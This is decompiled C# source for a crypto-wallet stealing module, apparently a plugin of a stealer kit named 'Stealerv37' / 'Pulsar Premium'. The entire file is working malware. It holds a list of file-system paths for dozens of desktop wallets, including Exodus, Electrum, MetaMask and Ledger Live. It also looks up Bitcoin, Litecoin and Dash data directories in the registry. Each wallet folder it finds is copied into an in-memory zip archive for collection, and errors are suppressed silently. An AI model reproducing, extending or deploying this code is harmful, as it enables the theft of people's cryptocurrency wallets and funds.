// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Crypto.CryptoDesktop
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Crypto;

public class CryptoDesktop : ITarget
{
  private static readonly List<string[]> SWalletsDirectories = new List<string[]>()
  {
    new string[2]
    {
      "Zcash",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Zcash")
    },
    new string[2]
    {
      "Armory",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Armory")
    },
    new string[2]
    {
      "Bytecoin",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "bytecoin")
    },
    new string[2]
    {
      "Jaxx",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")
    },
    new string[2]
    {
      "Exodus",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus", "exodus.wallet")
    },
    new string[2]
    {
      "Ethereum",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ethereum", "keystore")
    },
    new string[2]
    {
      "Electrum",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")
    },
    new string[2]
    {
      "AtomicWallet",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "atomic", "Local Storage", "leveldb")
    },
    new string[2]
    {
      "Atomic",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Atomic", "Local Storage", "leveldb")
    },
    new string[2]
    {
      "Guarda",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Guarda", "Local Storage", "leveldb")
    },
    new string[2]
    {
      "Coinomi",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Coinomi", "Coinomi", "wallets")
    },
    new string[2]
    {
      "Tari",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.tari.universe", "app_configs", "mainnet")
    },
    new string[2]
    {
      "Tari",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "com.tari.universe", "wallet", "mainnet", "data", "wallet")
    },
    new string[2]
    {
      "Bitcoin",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Bitcoin", "wallets")
    },
    new string[2]
    {
      "Bitcoin",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallets")
    },
    new string[2]
    {
      "Dash",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DashCore", "wallets")
    },
    new string[2]
    {
      "Litecoin",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Litecoin", "wallets")
    },
    new string[2]
    {
      "MyMonero",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyMonero")
    },
    new string[2]
    {
      "Monero",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Monero")
    },
    new string[2]
    {
      "Vertcoin",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Vertcoin")
    },
    new string[2]
    {
      "Groestlcoin",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Groestlcoin")
    },
    new string[2]
    {
      "Komodo",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Komodo")
    },
    new string[2]
    {
      "PIVX",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PIVX")
    },
    new string[2]
    {
      "BitcoinGold",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "BitcoinGold")
    },
    new string[2]
    {
      "Electrum-LTC",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum-LTC")
    },
    new string[2]
    {
      "Binance",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Binance")
    },
    new string[2]
    {
      "Phantom",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Phantom", "IndexedDB", "file__0.indexeddb.leveldb")
    },
    new string[2]
    {
      "Coin98",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Coin98", "IndexedDB", "file__0.indexeddb.leveldb")
    },
    new string[2]
    {
      "MathWallet",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MathWallet", "IndexedDB", "file__0.indexeddb.leveldb")
    },
    new string[2]
    {
      "LedgerLive",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ledger Live")
    },
    new string[2]
    {
      "TrezorSuite",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TrezorSuite")
    },
    new string[2]
    {
      "MyEtherWallet",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyEtherWallet")
    },
    new string[2]
    {
      "MyCrypto",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyCrypto")
    },
    new string[2]
    {
      "MetaMask",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MetaMask", "IndexedDB", "file__0.indexeddb.leveldb")
    },
    new string[2]
    {
      "TrustWallet",
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TrustWallet", "IndexedDB", "file__0.indexeddb.leveldb")
    }
  };
  private static readonly string[] SWalletsRegistry = new string[3]
  {
    "Litecoin",
    "Dash",
    "Bitcoin"
  };

  public void Collect(InMemoryZip zip, Counter counter)
  {
    try
    {
      Parallel.ForEach<string[]>((IEnumerable<string[]>) CryptoDesktop.SWalletsDirectories, (Action<string[]>) (sw => this.CopyWalletFromDirectoryTo(sw[1], sw[0], zip, counter)));
      Parallel.ForEach<string>((IEnumerable<string>) CryptoDesktop.SWalletsRegistry, (Action<string>) (sWalletRegistry => this.CopyWalletFromRegistryTo(sWalletRegistry, zip, counter)));
    }
    catch
    {
    }
  }

  private void CopyWalletFromDirectoryTo(
    string sWalletDir,
    string sWalletName,
    InMemoryZip zip,
    Counter counter)
  {
    if (!Directory.Exists(sWalletDir))
      return;
    zip.AddDirectoryFiles(sWalletDir, sWalletName);
    counter.CryptoDesktop.Add($"{sWalletDir} => {sWalletName}");
  }

  private void CopyWalletFromRegistryTo(string sWalletRegistry, InMemoryZip zip, Counter counter)
  {
    try
    {
      string name = $"Software\\{sWalletRegistry}\\{sWalletRegistry}-Qt";
      string path1 = Registry.CurrentUser.OpenSubKey(name)?.GetValue("strDataDir")?.ToString();
      if (path1 == null)
        return;
      string str = Path.Combine(path1, "wallets");
      if (!Directory.Exists(str))
        return;
      zip.AddDirectoryFiles(str, sWalletRegistry);
      counter.CryptoDesktop.Add($"{str} => {sWalletRegistry}");
    }
    catch
    {
    }
  }
}
